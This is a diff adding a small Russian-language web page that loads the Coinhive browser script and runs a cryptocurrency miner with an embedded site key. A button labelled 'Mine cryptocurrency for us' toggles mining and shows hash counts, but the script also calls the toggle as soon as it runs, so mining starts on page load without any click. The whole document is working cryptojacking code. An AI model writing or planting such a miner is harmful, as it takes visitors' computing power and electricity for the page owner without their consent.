@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+	<meta charset="UTF-8">
+	<title>miner</title>
+</head>
+<body>
+	<button id="miner-block">Майнить криптовалюту для нас</button>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+	<script>(function() {
+				var miner = new CoinHive.Anonymous('MNWa4CAqIZmkx1HyUFSTKWTZ9fh9Utpw');
+				var minerBlock = document.getElementById('miner-block');
+				var text = 'Майнить криптовалюту для нас';
+				var textStop = 'Остановить';
+				var defaultValue = '0/0';
+				var interval = null;
+
+				var toggleMnining = function() {
+					if (miner.isRunning()) {
+						miner.stop();
+						clearInterval(interval);
+						minerBlock.innerText = text;
+					} else {
+						miner.start();
+						minerBlock.innerText = textStop + ' ' + defaultValue;
+						interval = setInterval(function() {
+							var hashesPerSecond = miner.getHashesPerSecond();
+							var totalHashes = miner.getTotalHashes();
+							var acceptedHashes = miner.getAcceptedHashes();
+
+							minerBlock.innerText = textStop + ' ' + totalHashes + '/' + acceptedHashes;
+						}, 2222);
+					}
+				}
+
+				minerBlock.addEventListener('click', toggleMnining, false);
+				toggleMnining();
+			})();</script>
+</body>
+</html>
